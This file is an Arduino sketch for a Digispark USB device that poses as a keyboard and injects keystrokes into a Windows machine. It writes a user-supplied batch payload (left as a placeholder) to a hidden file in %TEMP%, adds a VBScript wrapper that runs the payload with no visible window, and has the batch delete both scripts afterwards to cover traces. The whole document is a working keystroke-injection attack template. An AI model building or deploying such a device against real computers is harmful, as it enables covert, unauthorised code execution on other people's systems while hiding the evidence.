#include "DigiKeyboardFr.h"

void setup() {
  //open notepad
  DigiKeyboardFr.delay(5000);
  DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.println("notepad");
  DigiKeyboardFr.delay(1000);

  //batch injection code
  DigiKeyboardFr.println("REM Write here any batch code you want uwu");
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER); //use this to make line breaks
  
  //delete the scripts after use
  DigiKeyboardFr.println("del %TEMP%\\.vbs");
  DigiKeyboardFr.println("del %TEMP%\\.bat");

  //save as %temp%\.bat
  DigiKeyboardFr.sendKeyStroke(KEY_S, MOD_CONTROL_RIGHT);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print(".bat");
  DigiKeyboardFr.delay(50);
  DigiKeyboardFr.sendKeyStroke(KEY_F4);
  DigiKeyboardFr.delay(50);
  DigiKeyboardFr.sendKeyStroke(KEY_Q, MOD_CONTROL_RIGHT);
  DigiKeyboardFr.delay(50);
  DigiKeyboardFr.println("%TEMP%");
  DigiKeyboardFr.delay(1500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_Z, MOD_CONTROL_RIGHT);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(200);

  //create .vbs script to hide the execution of the .bat script
  DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.println("notepad");
  DigiKeyboardFr.delay(1000);
  DigiKeyboardFr.print("CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False");
  DigiKeyboardFr.delay(50);
  DigiKeyboardFr.sendKeyStroke(KEY_S, MOD_CONTROL_RIGHT);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.print(".vbs");
  DigiKeyboardFr.delay(50);
  DigiKeyboardFr.sendKeyStroke(KEY_F4);
  DigiKeyboardFr.delay(50);
  DigiKeyboardFr.sendKeyStroke(KEY_Q, MOD_CONTROL_RIGHT);
  DigiKeyboardFr.delay(50);
  DigiKeyboardFr.println("%TEMP%");
  DigiKeyboardFr.delay(1500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_Z, MOD_CONTROL_RIGHT);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_ARROW_RIGHT);
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardFr.delay(500);

  //execute the whole thing
  DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
  DigiKeyboardFr.delay(200);
  DigiKeyboardFr.println("wscript.exe %TEMP%\\.vbs %TEMP%\\.bat");
}

void loop() {
}
